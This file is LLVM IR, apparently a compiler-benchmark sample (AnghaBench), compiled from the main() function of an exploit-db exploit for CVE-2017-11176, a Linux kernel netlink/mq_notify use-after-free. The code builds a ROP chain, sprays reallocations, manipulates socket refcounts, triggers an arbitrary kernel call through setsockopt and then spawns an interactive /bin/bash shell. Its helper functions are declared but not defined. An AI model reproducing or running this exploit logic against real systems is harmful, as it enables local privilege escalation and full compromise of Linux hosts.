; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45553.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45553.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_7__ = type { i32, i32 }
%struct.TYPE_8__ = type { i32, i32 }
%struct.realloc_thread_arg = type { i32 }

@NB_REALLOC_THREADS = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [36 x i8] c"[ ] -={ CVE-2017-11176 Exploit }=-\0A\00", align 1
@.str.1 = private unnamed_addr constant [32 x i8] c"[-] failed to migrate to CPU#0\0A\00", align 1
@.str.2 = private unnamed_addr constant [36 x i8] c"[+] successfully migrated to CPU#0\0A\00", align 1
@.str.3 = private unnamed_addr constant [45 x i8] c"[-] failed to allocate userland structures!\0A\00", align 1
@g_fake_stack = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [21 x i8] c"[+] ROP-chain ready\0A\00", align 1
@.str.5 = private unnamed_addr constant [40 x i8] c"[-] failed to initialize reallocation!\0A\00", align 1
@.str.6 = private unnamed_addr constant [25 x i8] c"[+] reallocation ready!\0A\00", align 1
@g_target = common dso_local global %struct.TYPE_7__ zeroinitializer, align 4
@g_guard = common dso_local global %struct.TYPE_8__ zeroinitializer, align 4
@.str.7 = private unnamed_addr constant [39 x i8] c"[-] failed to find netlink candidates\0A\00", align 1
@.str.8 = private unnamed_addr constant [31 x i8] c"[+] netlink candidates ready:\0A\00", align 1
@.str.9 = private unnamed_addr constant [21 x i8] c"[+] target.pid = %d\0A\00", align 1
@.str.10 = private unnamed_addr constant [21 x i8] c"[+] guard.pid  = %d\0A\00", align 1
@unblock_fd = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [8 x i8] c"[-] dup\00", align 1
@.str.12 = private unnamed_addr constant [56 x i8] c"[+] netlink fd duplicated (unblock_fd=%d, sock_fd2=%d)\0A\00", align 1
@.str.13 = private unnamed_addr constant [25 x i8] c"[+] guard socket closed\0A\00", align 1
@MAGIC_NL_PID = common dso_local global i32 0, align 4
@MAGIC_NL_GROUPS = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [26 x i8] c"[-] reallocation failed!\0A\00", align 1
@.str.15 = private unnamed_addr constant [40 x i8] c"[+] reallocation succeed! Have fun :-)\0A\00", align 1
@.str.16 = private unnamed_addr constant [42 x i8] c"[ ] invoking arbitrary call primitive...\0A\00", align 1
@SOL_NETLINK = common dso_local global i32 0, align 4
@NETLINK_NO_ENOBUFS = common dso_local global i32 0, align 4
@.str.17 = private unnamed_addr constant [15 x i8] c"[-] setsockopt\00", align 1
@.str.18 = private unnamed_addr constant [29 x i8] c"[+] arbitrary call succeed!\0A\00", align 1
@.str.19 = private unnamed_addr constant [23 x i8] c"[+] exploit complete!\0A\00", align 1
@.str.20 = private unnamed_addr constant [24 x i8] c"[ ] popping shell now!\0A\00", align 1
@.str.21 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@.str.22 = private unnamed_addr constant [3 x i8] c"-i\00", align 1
@.str.23 = private unnamed_addr constant [21 x i8] c"[-] exploit failed!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i64, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [3 x i8*], align 16
  %8 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 -1, i32* %2, align 4
  %9 = load i32, i32* @NB_REALLOC_THREADS, align 4
  %10 = zext i32 %9 to i64
  %11 = call i8* @llvm.stacksave()
  store i8* %11, i8** %4, align 8
  %12 = alloca %struct.realloc_thread_arg, i64 %10, align 16
  store i64 %10, i64* %5, align 8
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str, i64 0, i64 0))
  %14 = call i64 (...) @migrate_to_cpu0()
  %15 = icmp ne i64 %14, 0
  br i1 %15, label %16, label %18

16:                                               ; preds = %0
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0))
  br label %109

18:                                               ; preds = %0
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0))
  %20 = call i64 (...) @allocate_uland_structs()
  %21 = icmp ne i64 %20, 0
  br i1 %21, label %22, label %24

22:                                               ; preds = %18
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i64 0, i64 0))
  br label %109

24:                                               ; preds = %18
  %25 = load i64, i64* @g_fake_stack, align 8
  %26 = inttoptr i64 %25 to i32*
  %27 = call i32 @build_rop_chain(i32* %26)
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  %29 = mul nuw i64 4, %10
  %30 = trunc i64 %29 to i32
  %31 = call i32 @memset(%struct.realloc_thread_arg* %12, i32 0, i32 %30)
  %32 = load i32, i32* @NB_REALLOC_THREADS, align 4
  %33 = call i64 @init_reallocation(%struct.realloc_thread_arg* %12, i32 %32)
  %34 = icmp ne i64 %33, 0
  br i1 %34, label %35, label %37

35:                                               ; preds = %24
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.5, i64 0, i64 0))
  br label %109

37:                                               ; preds = %24
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.6, i64 0, i64 0))
  %39 = call i64 @find_netlink_candidates(%struct.TYPE_7__* @g_target, %struct.TYPE_8__* @g_guard)
  %40 = icmp ne i64 %39, 0
  br i1 %40, label %41, label %43

41:                                               ; preds = %37
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.7, i64 0, i64 0))
  br label %109

43:                                               ; preds = %37
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.8, i64 0, i64 0))
  %45 = load i32, i32* getelementptr inbounds (%struct.TYPE_7__, %struct.TYPE_7__* @g_target, i32 0, i32 0), align 4
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.9, i64 0, i64 0), i32 %45)
  %47 = load i32, i32* getelementptr inbounds (%struct.TYPE_8__, %struct.TYPE_8__* @g_guard, i32 0, i32 0), align 4
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.10, i64 0, i64 0), i32 %47)
  %49 = call i64 @fill_receive_buffer(%struct.TYPE_7__* @g_target, %struct.TYPE_8__* @g_guard)
  %50 = icmp ne i64 %49, 0
  br i1 %50, label %51, label %52

51:                                               ; preds = %43
  br label %109

52:                                               ; preds = %43
  %53 = load i32, i32* getelementptr inbounds (%struct.TYPE_7__, %struct.TYPE_7__* @g_target, i32 0, i32 1), align 4
  %54 = call i32 @_dup(i32 %53)
  store i32 %54, i32* @unblock_fd, align 4
  %55 = icmp slt i32 %54, 0
  br i1 %55, label %60, label %56

56:                                               ; preds = %52
  %57 = load i32, i32* getelementptr inbounds (%struct.TYPE_7__, %struct.TYPE_7__* @g_target, i32 0, i32 1), align 4
  %58 = call i32 @_dup(i32 %57)
  store i32 %58, i32* %2, align 4
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %62

60:                                               ; preds = %56, %52
  %61 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i64 0, i64 0))
  br label %109

62:                                               ; preds = %56
  %63 = load i32, i32* @unblock_fd, align 4
  %64 = load i32, i32* %2, align 4
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.12, i64 0, i64 0), i32 %63, i32 %64)
  %66 = load i32, i32* getelementptr inbounds (%struct.TYPE_7__, %struct.TYPE_7__* @g_target, i32 0, i32 1), align 4
  %67 = load i32, i32* @unblock_fd, align 4
  %68 = call i64 @decrease_sock_refcounter(i32 %66, i32 %67)
  %69 = icmp ne i64 %68, 0
  br i1 %69, label %75, label %70

70:                                               ; preds = %62
  %71 = load i32, i32* %2, align 4
  %72 = load i32, i32* @unblock_fd, align 4
  %73 = call i64 @decrease_sock_refcounter(i32 %71, i32 %72)
  %74 = icmp ne i64 %73, 0
  br i1 %74, label %75, label %76

75:                                               ; preds = %70, %62
  br label %109

76:                                               ; preds = %70
  %77 = call i32 (...) @realloc_NOW()
  %78 = load i32, i32* getelementptr inbounds (%struct.TYPE_8__, %struct.TYPE_8__* @g_guard, i32 0, i32 1), align 4
  %79 = call i32 @close(i32 %78)
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.13, i64 0, i64 0))
  %81 = load i32, i32* @unblock_fd, align 4
  %82 = load i32, i32* @MAGIC_NL_PID, align 4
  %83 = load i32, i32* @MAGIC_NL_GROUPS, align 4
  %84 = call i32 @check_realloc_succeed(i32 %81, i32 %82, i32 %83)
  %85 = icmp ne i32 %84, 0
  br i1 %85, label %88, label %86

86:                                               ; preds = %76
  %87 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.14, i64 0, i64 0))
  br label %109

88:                                               ; preds = %76
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.15, i64 0, i64 0))
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.16, i64 0, i64 0))
  store i32 3535, i32* %3, align 4
  %91 = load i32, i32* @unblock_fd, align 4
  %92 = load i32, i32* @SOL_NETLINK, align 4
  %93 = load i32, i32* @NETLINK_NO_ENOBUFS, align 4
  %94 = call i64 @_setsockopt(i32 %91, i32 %92, i32 %93, i32* %3, i32 4)
  %95 = icmp ne i64 %94, 0
  br i1 %95, label %96, label %98

96:                                               ; preds = %88
  %97 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.17, i64 0, i64 0))
  br label %109

98:                                               ; preds = %88
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.18, i64 0, i64 0))
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.19, i64 0, i64 0))
  %101 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.20, i64 0, i64 0))
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.21, i64 0, i64 0), i8** %6, align 8
  %102 = getelementptr inbounds [3 x i8*], [3 x i8*]* %7, i64 0, i64 0
  %103 = load i8*, i8** %6, align 8
  store i8* %103, i8** %102, align 8
  %104 = getelementptr inbounds i8*, i8** %102, i64 1
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.22, i64 0, i64 0), i8** %104, align 8
  %105 = getelementptr inbounds i8*, i8** %104, i64 1
  store i8* null, i8** %105, align 8
  %106 = load i8*, i8** %6, align 8
  %107 = getelementptr inbounds [3 x i8*], [3 x i8*]* %7, i64 0, i64 0
  %108 = call i32 @execve(i8* %106, i8** %107, i32* null)
  store i32 0, i32* %1, align 4
  store i32 1, i32* %8, align 4
  br label %112

109:                                              ; preds = %96, %86, %75, %60, %51, %41, %35, %22, %16
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.23, i64 0, i64 0))
  %111 = call i32 (...) @PRESS_KEY()
  store i32 -1, i32* %1, align 4
  store i32 1, i32* %8, align 4
  br label %112

112:                                              ; preds = %109, %98
  %113 = load i8*, i8** %4, align 8
  call void @llvm.stackrestore(i8* %113)
  %114 = load i32, i32* %1, align 4
  ret i32 %114
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i64 @migrate_to_cpu0(...) #2

declare dso_local i64 @allocate_uland_structs(...) #2

declare dso_local i32 @build_rop_chain(i32*) #2

declare dso_local i32 @memset(%struct.realloc_thread_arg*, i32, i32) #2

declare dso_local i64 @init_reallocation(%struct.realloc_thread_arg*, i32) #2

declare dso_local i64 @find_netlink_candidates(%struct.TYPE_7__*, %struct.TYPE_8__*) #2

declare dso_local i64 @fill_receive_buffer(%struct.TYPE_7__*, %struct.TYPE_8__*) #2

declare dso_local i32 @_dup(i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i64 @decrease_sock_refcounter(i32, i32) #2

declare dso_local i32 @realloc_NOW(...) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @check_realloc_succeed(i32, i32, i32) #2

declare dso_local i64 @_setsockopt(i32, i32, i32, i32*, i32) #2

declare dso_local i32 @execve(i8*, i8**, i32*) #2

declare dso_local i32 @PRESS_KEY(...) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
